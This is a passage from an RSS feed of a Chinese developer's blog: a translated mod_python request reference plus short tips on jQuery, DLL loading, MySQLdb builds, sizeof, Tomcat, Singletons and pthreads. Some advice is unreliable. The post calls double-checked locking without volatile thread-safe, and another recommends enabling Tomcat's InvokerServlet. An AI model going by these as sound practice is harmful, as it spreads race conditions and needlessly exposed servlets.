<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>allowed_xmethods</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">元组，允许的扩展</font><font face="Courier New, monospace"><span lang="en-US">(extension)</span></font><font face="宋体">方法。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>allowed_methods</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">元组，允许的方法，使用</font><font face="Courier New, monospace"><span lang="en-US">METHOD_NOT_ALLOWED</span></font><font face="宋体">的关系。这个成员无法被</font><font face="Courier New, monospace"><span lang="en-US">req.allow_methods()</span></font><font face="宋体">方法修改。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>sent_bodyct</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">整数，正文的字节数。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>bytes_sent</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">长整数，已经发送的字节数。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>mtime</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">长整数，资源的修改时间。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>chunked</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">传送大块数据时的编码，布尔值。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>range</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">字符串</font><font face="Courier New, monospace"><span lang="en-US">'Range:'</span></font><font face="宋体">头。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>clength</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">长整数，真正的正文长度。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>remaining</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">长整数，等待读取的数据字节数，只在一个读取操作中有效，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>read_length</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">长整数，已经读取的字节数，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>read_body</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">整数，请求体怎样被读取，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>read_chunked</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">布尔值，读取大块数据的编码。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>expecting_100</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">布尔值，是否客户端需要等待</font><font face="Courier New, monospace"><span lang="en-US">100(HTTP_CONTINUE)</span></font><font face="宋体">响应，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>headers_in</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">客户端发来的头的表格对象。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>headers_out</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">需要发送给客户端的头的表格对象。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>err_headers_out</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">当出错时需要发送的头的表格对象，用于出错时替换</font><font face="Courier New, monospace"><span lang="en-US">headers_out</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>subprocess_env</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">包含</font><font face="Courier New, monospace"><span lang="en-US">CGI</span></font><font face="宋体">信息的表格对象。在需要信息之前需要先调用</font><font face="Courier New, monospace"><span lang="en-US">req.add_common_vars()</span></font><font face="宋体">方法来填充信息。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>notes</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">与请求拥有共同生存期的对象，用于存储各种信息，可以在一个请求的各个处理器之间传递信息。如果确实需要在各个处理器之间传递信息，最好的方式是给请求对象添加成员。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>phase</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">正在处理的阶段，比如</font><font face="Courier New, monospace"><span lang="en-US">'PythonHandler'</span></font><font face="宋体">，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>interpreter</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">正在运行的子解释器名。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>content_type</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">字符串，正文类型。</font><font face="Courier New, monospace"><span lang="en-US">mod_python</span></font><font face="宋体">维护一个内部标志</font><font face="Courier New, monospace"><span lang="en-US"><font color="#0000ff">(req._content_type_set)</font></span></font><font face="宋体">来保持</font><font face="Courier New, monospace"><span lang="en-US">content_type</span></font><font face="宋体">的设置。发布器按照如下方式使用这个标志：当</font><font face="Courier New, monospace"><span lang="en-US">content_type</span></font><font face="宋体">没有明确</font><font face="Courier New, monospace"><span lang="en-US">(explicitly)</span></font><font face="宋体">的设置时，它依靠输出的前几个字节来猜测</font><font face="Courier New, monospace"><span lang="en-US">(attempt)</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>content_languages</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">元组。用字符串列表表示正文的语言。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>handler</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">当前处理器的名字。由</font><font face="Courier New, monospace"><span lang="en-US">mod_mime</span></font><font face="宋体">设置，而不是</font><font face="Courier New, monospace"><span lang="en-US">mod_python</span></font><font face="宋体">处理器。大多数情况还是</font><font face="Courier New, monospace"><span lang="en-US">'mod_python'</span></font><font face="宋体">，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>content_encoding</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">字符串，正文编码，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>vlist_validator</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">整数，有效变量的列表</font><font face="Courier New, monospace"><span lang="en-US">(</span></font><font face="宋体">如果为负数</font><font face="Courier New, monospace"><span lang="en-US">)</span></font><font face="宋体">，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>user</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">获取验证的用户名。同</font><font face="Courier New, monospace"><span lang="en-US">CGI
REMOTE_USER</span></font><font face="宋体">，只读。注意，</font><font face="Courier New, monospace"><span lang="en-US">req.get_basic_auth_pw()</span></font><font face="宋体">必须在此之前调用</font><font face="Courier New, monospace"><span lang="en-US">(be called prior)</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>ap_auth_type</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">验证类型，同</font><font face="Courier New, monospace"><span lang="en-US">CGI
AUTH_TYPE</span></font><font face="宋体">，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>no_cache</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">布尔值，如果为</font><font face="Courier New, monospace"><span lang="en-US">true</span></font><font face="宋体">则没有缓存，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>no_local_copy</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">布尔值，如果没有本地副本，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>unparsed_uri</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">URI</span></font><font face="宋体">没有经过任何转换，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>uri</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US">URI</span></font><font face="宋体">的一部分路径，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>filename</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">请求的文件名字符串。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>canonical_filename</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">字符串，真实的文件名</font><font face="Courier New, monospace"><span lang="en-US">(req.filename</span></font><font face="宋体">是有效的，如果她们不同</font><font face="Courier New, monospace"><span lang="en-US">)</span></font><font face="宋体">。只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>path_info</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">字符串，在文件名之后，查询参数之前的部分。同</font><font face="Courier New, monospace"><span lang="en-US">CGI
PATH_INFO</span></font><font face="宋体">。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>args</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">字符串，同</font><font face="Courier New, monospace"><span lang="en-US">CGI
QUERY_ARGS</span></font><font face="宋体">，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>finfo</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">元组，文件信息结构，类似于</font><font face="Courier New, monospace"><span lang="en-US">POSIX</span></font><font face="宋体">状态，</font><font face="Courier New, monospace"><span lang="en-US">URI</span></font><font face="宋体">指向的文件的信息</font><font face="Courier New, monospace"><span lang="en-US">(mode,ino,dev,nlink,uid,gid,size,atime,mtime,ctime,fname,name)</span></font><font face="宋体">。模块</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">定义了</font><font face="Courier New, monospace"><span lang="en-US">FINFO_*</span></font><font face="宋体">变量的常量，可用于存取其中的元素，如：</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">fname=req.finfo[apache.FINFO_FNAME]</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>parsed_uri</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">元组，被分解开的</font><font face="Courier New, monospace"><span lang="en-US">URI</span></font><font face="宋体">：</font><font face="Courier New, monospace"><span lang="en-US">(scheme,hostinfo,user,
password, hostname,
port,path,query,fragment)</span></font><font face="宋体">。模块</font><font face="Courier New, monospace"><span lang="en-US">apache</span></font><font face="宋体">定义了</font><font face="Courier New, monospace"><span lang="en-US">URI*</span></font><font face="宋体">常量用于存取元组的元素，如：</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font color="#0000ff"><font face="Courier New, monospace"><span lang="en-US">fname=req.parsed_uri[apache.URI_PATH]</span></font></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>used_path_info</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">当前请求中被拒绝</font><font face="Courier New, monospace"><span lang="en-US">(reject)</span></font><font face="宋体">的</font><font face="Courier New, monospace"><span lang="en-US">path_info</span></font><font face="宋体">，只读。</font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="Courier New, monospace"><span lang="en-US"><b>eos_sent</b></span></font></p>
<p style="margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);" align="justify">
<font face="宋体">布尔值，是否发送过</font><font face="Courier New, monospace"><span lang="en-US">EOS</span></font><font face="宋体">，只读。</font><font face="Courier New, monospace"><span lang="en-US">(EOS=end of
stream)</span></font></p>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201002211200164/</guid>
    </item>
    <item>
      <title>
<![CDATA[jquery的iframe操作]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009112992418428/</link>
      <description>
<![CDATA[$(document).ready(function(){<br>&nbsp;&nbsp; &nbsp;$("table").css("width",&lt;bean:write name="treeHeight"/&gt;*60);<br>&nbsp;&nbsp; &nbsp;//设置高度<br>&nbsp;&nbsp; &nbsp;var main = $(window.parent.document).find("#treeFrame");<br>&nbsp;&nbsp; &nbsp;var thisheight = $(document).height()+30;<br>&nbsp;&nbsp; &nbsp;main.height(thisheight);<br>&nbsp;&nbsp; &nbsp;$(".stepui").click(function(){<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var id=$(this).attr("id");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find("#on<wbr>estep").show();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find("#detailname").html("&lt;a href='../act<wbr>ion/viewCraftStep.do?id="+encodeURI(id)+"'&gt;"+$(this).text()+"&lt;/a&gt;");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find("#detailpriv").html("&lt;a href='../act<wbr>ion/addCraftStep.do?ready=false&amp;act<wbr>ion=priv&amp;id="+encodeURI(id)+"'&gt;添加&lt;/a&gt;");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if($(this).attr("class").indexOf("noNext")!=-1)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find("#detailnext").html("&lt;a href='../act<wbr>ion/addCraftStep.do?ready=false&amp;act<wbr>ion=next&amp;id="+encodeURI(id)+"'&gt;添加&lt;/a&gt;");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find("#detailnext").html('');<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(window.parent.document).find("#detailedit").html("&lt;a href=../act<wbr>ion/editCraftStep.do?ready=false&amp;id="+encodeURI(id)+"&gt;编辑&lt;/a&gt;");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return false;<br>&nbsp;&nbsp; &nbsp;});<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br>});]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009112992418428/</guid>
    </item>
    <item>
      <title>
<![CDATA[VC++动态加载dll]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201051910408644/</link>
      <description>
<![CDATA[Win XP 没有蓝牙协议栈，因此要安装BlueSolei之类的蓝牙工具包，然后就可以用Blue Soleil 提供的 SDK，连接BlueSoleil的dll.<br>但是Win7已经支持蓝牙了，就不需要安装BlueSoleil了，程序也就找不到blue Soleil的dll了。<br>如何解决程序在Win XP和Win7上的差异呢<br>一是使用宏，在WinXP上编译时，编译上BlueSolei相关的代码，在Win7上编译时，不编译BlueSoleil相关的代码。<br>但是没有找到判断操作系统是WinXP还是Win7这样的宏<br>二是使用动态加载dll的方法<br>HINSTANCE&nbsp; btLib = LoadLibrary(TEXT("btfunc.dll"));&nbsp; //获取dll句柄<br>typedef BOOL (__cdecl *BTLibInit)(void);&nbsp; //定义函数原型<br>BTLibInit btInit = (BTLibInit)GetProcAddress(btLib, "BT_InitializeLibrary"); //获取函数入口<br>if(!(btInit)()){ //调用函数<br>}<br>函数原型和函数入口名可以从SDK提供的头文件中获得。或者先用传统的方式加载，然后再必定成这种动态加载的方式。<br>例如上例是从BOOL BT_InitializeLibrary(void) 改写成的]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201051910408644/</guid>
    </item>
    <item>
      <title>
<![CDATA[windows(win7)python2.6安装python-MySQLdb]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201052502031934/</link>
      <description>
<![CDATA[首先下载mysql安装文件，官网上下载太麻烦了，直接去天空软件站下载：<br>http://www.skycn.com/soft/1262.html<br>注意安装的时候选择Custom选项，然后把C Include Files/Lib Files选中，因为后面build时需要<br>然后下载MySQLdb<br>http://sourceforge.net/projects/mysql-python/files/<br>解压缩到一个文件夹中，然后开始安装<br>首先安装 easy_install<br>python ez_install.py<br>然后build MySQLdb<br>python setup.py build<br>出现错误1:<br>serverKey = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, options['registry_key']) WindowsError: [Error 2]<br>解决方法：<br>打开MySQL-python-1.2.3/site.cfg文件，将最后一行的5.0修改为5.1，如下所示:<br>registry_key = SOFTWARE\MySQL AB\MySQL Server 5.1<br><br>重新python setup.py build<br>出现错误2:<br>build\temp.win32-2.6\Release\_mysql.pyd.manifest : general error c1010070: Failed to load and parse the manifest. The system cannot find&nbsp; the file specified.<br>error: command ‘mt.exe’ failed with exit status 31<br>解决方法：<br>打开 C:\Python26\Lib\distutils\msvc9compiler.py<br>找到这一行 ld_args.append(‘/MANIFESTFILE:’ + temp_manifest)<br>然后在下面加入一行 ld_args.append(‘/MANIFEST’)<br><br>重新python setup.py build成功<br>最后执行<br>python setup.py install<br>成功<br><br>googlecode 上有别人编译好的exe程序，也许能用]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>DataBase</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201052502031934/</guid>
    </item>
    <item>
      <title>
<![CDATA[C++中的sizeof关键字]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010316114719699/</link>
      <description>
<![CDATA[void fun(short h[100]){<br>&nbsp;&nbsp; &nbsp;int i = sizeof(h);//4 pointer<br>}<br>int main(){<br>&nbsp;&nbsp; &nbsp;int *p = 0;<br>&nbsp;&nbsp; &nbsp;int size = sizeof(p);//4 pointer<br>&nbsp;&nbsp; &nbsp;size = sizeof(*p);//4 int<br>&nbsp;&nbsp; &nbsp;short a[100];<br>&nbsp;&nbsp; &nbsp;size = sizeof(a);//200 2*100<br>&nbsp;&nbsp; &nbsp;size = sizeof(a[100]);//2 int<br>&nbsp;&nbsp; &nbsp;size = sizeof(&amp;a);//4 pointer<br>&nbsp;&nbsp; &nbsp;size = sizeof(&amp;a[0]);//4 pointer<br>&nbsp;&nbsp; &nbsp;short h[100];<br>&nbsp;&nbsp; &nbsp;fun(h);<br>&nbsp;&nbsp; &nbsp;return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010316114719699/</guid>
    </item>
    <item>
      <title>
<![CDATA[Tomcat不用配置web.xml执行Servlet-InvokeServlet]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078642922241/</link>
      <description>
<![CDATA[<P>在web.xml里加入如下一段</P>
<P>&nbsp;&lt;servlet&gt;<BR>&nbsp;&nbsp;&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;<BR>&nbsp;&nbsp;&lt;servlet-class&gt;org.apache.catalina.servlets.InvokerServlet&lt;/servlet-class&gt;<BR>&nbsp;&lt;/servlet&gt;<BR>&nbsp;&lt;servlet-mapping&gt;<BR>&nbsp;&nbsp;&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;<BR>&nbsp;&nbsp;&lt;url-pattern&gt;/servlet/*&lt;/url-pattern&gt;<BR>&nbsp;&lt;/servlet-mapping&gt;</P>
<P>然后就可以直接用/servlet/cn.ssdut.TestServlet来直接访问cn.ssdut.TestServlet这个Servlet了。不用在xml中一个一个的配置Servlet了，在某些需要高度灵活性的场合可以使用。</P>
<P>个人比较喜欢这种机制，因为它的灵活性很好，可以在不修改原网站任何部署的情况下增加新功能，结合数据库，就可以实现用数据库来配置网站部署的功能。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078642922241/</guid>
    </item>
    <item>
      <title>
<![CDATA[Singleton的几种实现]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201042895045549/</link>
      <description>
<![CDATA[1.非延时加载（全局变量法）<br>private static Singleton instance = new Singleton();<br>public
 static Singleton getInstance(){<br>&nbsp; return instance;<br>}<br>问题：可能程序中根
本不需要实例化Singleton，这样做就会带来创建Singleton的额外开销<br>
非延时加载类似全局变量，而单例模式比全局变量的优势就是：延时加载！<br><br>2.最简单（线程不安全）<br>private Singleton(){}<br>private static Singleton instance = null;<br>public static Singleton getInstance(){<br>&nbsp; if(instance == null){//1.<br>&nbsp;&nbsp;&nbsp; instance = new Singleton();//2.<br>&nbsp; }<br>&nbsp; return instance;<br>}<br>问题：线程不安全，可能有两个线程同时运行到1，则同时检测到instance为null，从而创建了两个实例。<br><br>3. 同步+双重锁（线程安全）<br>public static Singleton getInstance(){<br>&nbsp; if(instance == null){&nbsp; //1.<br>&nbsp;&nbsp;&nbsp; synchronized(Singleton.class){ //2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(instance == null) //3<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; instance = new Singleton();<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp; }<br>&nbsp; return instance;<br>}<br>说明：<br>如果将synchronized加在1的位置，就很容易影响程序的性能，因此1是经常要执行的语句<br>因为synchronized关键字没加在1的位置，因此可能有两个线程同时到达2，并依次到达3，因此要在3进行第二次检查double check]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201042895045549/</guid>
    </item>
    <item>
      <title>
<![CDATA[pthread的内存泄露]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201072675024100/</link>
      <description>
<![CDATA[10116<br># cc thread.c -lpthread<br># ./a.out<br>1 threads created<br>101 threads created<br>201 threads created<br>301 threads created<br>ERROR, rc is 11, so far 382 threads created<br>Fail:: Resource temporarily unavailable<br>错误提示资源不足，其实是发生了内存泄露，在run函数中，使用pthread_exit退出的线程，并没有像预想的一样释放内存，而是进入僵死状态，只有进程退出的时候才能释放，要想让pthread_exit的线程及时退出，只要在pthread_create后加上pthread_join函数调用即可。只要有了pthread_join，即使没有调用pthread_exit，线程退出时也会释放内存。<br>也就是说pthread_exit只是线程的一个出口，和资源的释放无关，pthread_join直接决定资源是否能够及时释放。<br><br>#include&lt;pthread.h&gt;<br>void run() {<br>&nbsp;&nbsp;&nbsp; pthread_exit(0);<br>}<br><br>int main () {<br>&nbsp;&nbsp;&nbsp; pthread_t thread;<br>&nbsp;&nbsp;&nbsp; int rc;<br>&nbsp;&nbsp;&nbsp; long count = 0;<br>&nbsp;&nbsp;&nbsp; while(1) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(rc = pthread_create(&amp;thread, 0, run, 0) ) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("ERROR, rc is %d, %ld threads created\n", rc, count);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("Fail:");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 